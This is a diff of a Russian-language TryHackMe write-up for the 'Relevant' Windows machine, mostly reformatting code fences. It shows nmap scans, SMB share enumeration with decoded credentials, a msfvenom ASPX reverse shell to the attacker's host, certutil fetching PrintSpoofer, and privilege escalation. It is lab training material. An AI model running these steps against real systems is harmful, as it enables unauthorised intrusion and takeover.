@@ -6,7 +6,7 @@
 
 ---
 
-## Sugar
+### Sugar
 
 ```bash
 nmap_ctf() {
@@ -14,16 +14,16 @@ nmap_ctf() {
   sudo nmap -sS -p- -Pn --max-parallelism 100 --min-rate 1000 -v -oN nmap-sS.txt $ip && nmap -sT -Pn -sV -T4 -A -v -p "$(grep -oP \"^[0-9]+(?=/tcp\s+open)\" nmap-sS.txt | sort -n | paste -sd \",\")" -oN nmap-sV.txt $ip
 }
 ```
-
-
+  
+  
 ## 🔍 Сканирование
-
+  
 ```bash
 export ip=10.10.254.155св && nmap_ctf $ip
 ```
-
+  
 ### nmap
-```
+```bash
 PORT      STATE SERVICE       VERSION
 80/tcp    open  http          Microsoft IIS httpd 10.0
 | http-methods: 
@@ -93,15 +93,16 @@ Host script results:
 |_  message_signing: disabled (dangerous, but default)
 |_clock-skew: mean: 1h24m01s, deviation: 3h07m51s, median: 0s
 ```
-
+  
 ---
-
+  
+  
 ## 🕵️ Enumeration
-
+  
 ### smb
-
+  
 Есть уязвимости smb
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Relevant/scans]
 └─$ sudo nmap -p 445 --script "smb* and not brute" -Pn -sV -T4 --min-rate 5000 $ip
 
@@ -208,7 +209,7 @@ Host script results:
 ```
 
 Первым делом интересует шара `nt4wrksv` и найденный там файл `passwords.txt`
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Relevant/scans]
 └─$ smbclient \\\\$ip\\nt4wrksv -U ""                                             
 Password for [WORKGROUP\]:
@@ -228,7 +229,7 @@ QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
 ```
 
 Декодирую их и сохраняю на всякий случай для брутфорса
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Relevant/exploits]
 └─$ cat pass.txt   
 !P@$$W0rD!123
@@ -250,7 +251,7 @@ Bill
 ## 📂 Получение доступа
 
 Создаю реверс шелл
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Relevant/exploits]
 └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.104.16 LPORT=4444 -f aspx > shell.aspx
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -261,7 +262,7 @@ Final size of aspx file: 3395 bytes
 ```
 
 И загружаю через smb
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Relevant/exploits]
 └─$ smbclient //$ip/nt4wrksv -N
 Try "help" to get a list of possible commands.
@@ -271,7 +272,7 @@ smb: \>
 ```
 
 Перехожу по `http://10.10.42.142:49663/nt4wrksv/shell.aspx`, получаю сессию и читаю флаг
-```
+```bash
 ┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Relevant/exploits]
 └─$ nc -lvnp 4444                                                                               
 listening on [any] 4444 ...
@@ -289,7 +290,7 @@ THM{fdk4ka34vk346ksxfr21tg789ktf45}
 ```
 
 Информация по машине от winpeas
-```
+```bash
           ͹ Basic System Information
   Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits                                                                                                                                                            
     OS Name: Microsoft Windows Server 2016 Standard Evaluation
@@ -318,7 +319,7 @@ THM{fdk4ka34vk346ksxfr21tg789ktf45}
 ## ⚙️ Привилегии
 
 Первое, что пробую - SeImpersonatePrivilege
-```
+```bash
           ͹ Current Token privileges
   Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation                                                                                                                                                               
     SeAssignPrimaryTokenPrivilege: DISABLED
@@ -331,7 +332,7 @@ THM{fdk4ka34vk346ksxfr21tg789ktf45}
 ```
 
 Скачиваю `https://github.com/itm4n/PrintSpoofer` и загружаю на жертву
-```
+```bash
 c:\Users\Public>certutil -urlcache -f http://10.21.104.16:8888/PrintSpoofer64.exe print.exe
 certutil -urlcache -f http://10.21.104.16:8888/PrintSpoofer64.exe print.exe
 ****  Online  ****
@@ -339,7 +340,7 @@ CertUtil: -URLCache command completed successfully.
 ```
 
 Запускаю
-```
+```bash
 c:\Users\Public>print.exe -i -c "cmd.exe"
 print.exe -i -c "cmd.exe"
 [+] Found privilege: SeImpersonatePrivilege
